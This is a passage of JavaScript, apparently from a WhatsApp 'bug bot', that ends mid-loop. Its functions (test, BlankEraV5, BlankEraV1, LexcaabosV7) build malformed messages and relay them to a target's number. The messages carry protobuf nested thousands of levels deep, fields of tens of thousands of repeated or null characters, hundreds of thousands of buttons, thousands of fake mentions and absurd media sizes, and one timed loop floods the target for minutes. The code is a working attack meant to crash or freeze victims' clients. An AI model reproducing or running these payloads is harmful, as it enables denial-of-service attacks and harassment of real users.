        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });


    var MAX_BATCH = 1;
    var DELAY_MS  = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var ampasx = null;

            for (var depth = 5000; depth >= 2000 && !ampasx; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function test(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('error');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');
}

// blank 

async function BlankEraV5(sock, target) {
    const Lexcalux = {
      message: {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4",
                  mimetype: "image/jpeg",
                  fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                  fileLength: "99999999999998999",
                  height: 99999,
                  width: 99999,
                  mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                  fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                  directPath: "/o1/v/t24/f2/m269/",
                  mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                  jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                  contactVcard: true,
                  thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}.enc`,
                  thumbnailSha256: crypto.randomBytes(32).toString("base64"),
                  thumbnailEncSha256: crypto.randomBytes(32).toString("base64"),
                  thumbnailHeight: Math.floor(Math.random() * 1080),
                  thumbnailWidth: Math.floor(Math.random() * 1920)
                },
                hasMediaAttachment: true
              },
              body: {
                text: "Lexcaabos - Executed¿!",
              },
              nativeFlowMessage: {
                buttons: [
                  { name: "single_select", buttonParamsJson: "X" },
                  { name: "galaxy_message", buttonParamsJson: "{\"flow_message_version\":\"3\"}" },
                  { name: "call_permission_message", buttonParamsJson: "\x10".repeat(75000) }
                ],
                messageParamsJson: "X" + "\u0000".repeat(9000)
              },
              contextInfo: {
                mentionedJid: [
                  target,
                  ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 500000)}@lid`)
                ],
                forwardingScore: 9999,
                isForwarded: true,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: { conversation: "X" }
              }
            }
          }
        }
      }
    };

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LexzyMods - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Students Func Nanas",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "LexzyMods",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "LexzyMods - Executed¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/LexzyMods",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Lexcaabos - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(target, Iniochamy, {});

    await sock.relayMessage(target, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });

    const Lexcamy = {
        interactiveResponseMessage: {
            body: {
                text: "Student Func Nanas",
                format: 3
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                    wa_flow_response_params: {
                        title: "𑇂𑆵𑆴𑆿".repeat(75000)
                    }
                }),
                version: 3
            }
        }
    };

    await sock.relayMessage(target, Lexcamy, {
        participant: target,
    });
}

async function BlankEraV1(sock, target) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LexzyMods - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "makklooo" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Students Func Nanas",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "LexzyMods",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "LexzyMods - Executed¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/LexzyMods",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "LexzyMods - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});
}

// delayyy
async function LexcaabosV7(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const LexMsg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
          buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
        }]
      }
    }
  };

  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "LexzyModss - Executed",
          fileName: " done bos " + "ꦽ".repeat(75000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
          }
        }
      }
    }
  };

  const stickers = {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
      fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: Buffer.alloc(32, '').toString('base64'),
      mimetype: "image/webp",
      height: -1,
      width: 5000,
      directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
      fileLength: null,
      mediaKeyTimestamp: 1710000000,
      firstFrameLength: 999,
      firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      isAnimated: true,
      pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
        ],
        interactiveAnnotations: [{
          polygonVertices: [
            { x: 0.1, y: 0.1 },
            { x: 0.9, y: 0.1 },
            { x: 0.9, y: 0.9 },
            { x: 0.1, y: 0.9 }
          ],
          location: {
            latitude: -6.2088,
            longitude: 106.8456,
            name: `LexzyModss - Executed`,
          }
        }]
      },
      stickerSentTs: 1710000000,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "\u0000".repeat(9000),
      mediaKeyDomain: null
    }
  };

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: "LexzyModss - Executed",
              fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
              fileLength: "109951162777600",
              height: -9999,
              width: 9999,
              mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
              fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
              directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1774107894",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
              viewOnce: true,
              scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
              scanLengths: [6677, 48757, 32501, 42353],
              midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
            },
            hasMediaAttachment: null
          },
          body: {
            text: "\u0000".repeat(1000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            isBuldo: true,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            quotedMessage: {
              documentMessage: {
                url: "https://example.com/file.zip",
                mimetype: "application/zip",
                caption: "LexzyModss - Executed",
                fileName: "NanasMuda - Executed",
                fileLength: 99999,
                vCards: true
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "ြ".repeat(9000)
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 5 * 60 * 1500;

  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }, { participant: target });
  }

  await sock.relayMessage(target, {
    message: {
      extendedTextMessage: {
        text: "\u0003".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1999 },
              () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  }, { participant: target });

  const startTime2 = Date.now();
  const duration2 = 1 * 60 * 1000;

  while (Date.now() - startTime2 < duration2) {
    await sock.relayMessage(target, {
